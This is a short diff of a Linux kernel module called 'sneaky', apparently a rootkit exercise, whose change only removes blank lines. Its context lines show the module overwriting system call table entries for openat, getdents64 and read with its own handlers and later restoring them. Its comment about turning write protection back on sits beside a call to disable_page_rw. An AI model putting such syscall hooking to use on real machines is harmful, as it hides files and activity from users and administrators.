@@ -88,8 +88,6 @@ static int initialize_sneaky_module(void) {
     sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents;
     sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;
 
-
-
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *) sys_call_table);
 
@@ -109,7 +107,6 @@ static void exit_sneaky_module(void) {
     sys_call_table[__NR_openat] = (unsigned long) original_openat;
     sys_call_table[__NR_getdents64] = (unsigned long) original_getdents;
     sys_call_table[__NR_read] = (unsigned long) original_read;
-
 
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *) sys_call_table);
